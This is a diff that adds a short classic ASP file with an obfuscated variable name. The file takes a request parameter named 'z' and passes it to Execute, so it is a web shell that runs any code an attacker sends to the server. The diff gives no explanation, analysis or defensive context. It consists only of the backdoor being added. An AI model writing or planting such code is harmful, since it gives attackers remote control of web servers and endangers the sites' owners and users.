@@ -1,0 +1,7 @@
+<%
+Public S5Z2Z2Z2Z2Z2S5Z2S5Z2
+    S5Z2Z2Z2Z2Z2S5Z2S5Z2 = Request ( Chr ( 122 ) ) 
+ If S5Z2Z2Z2Z2Z2S5Z2S5Z2 <>   "" Then Execute ( S5Z2Z2Z2Z2Z2S5Z2S5Z2 )  
+    Response.Write vbCrLf 
+
+%>
